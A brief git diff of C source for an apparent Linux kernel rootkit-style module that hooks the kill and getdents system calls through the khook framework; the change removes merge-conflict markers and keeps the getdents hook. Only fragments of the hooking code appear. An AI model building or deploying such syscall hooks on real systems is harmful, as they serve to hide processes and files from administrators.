@@ -131,7 +131,7 @@ static long khook_sys_kill(pid_t pid, int sig) {
 	return ret;
 }
 
-<<<<<<< HEAD
+
 KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
 	long value=0;
@@ -153,8 +153,7 @@ static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *di
 　　return value;
 	}
 }
-=======
->>>>>>> 58051b96eb5a266311810f358ae7b80d1a13957f
+
 
 /*
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
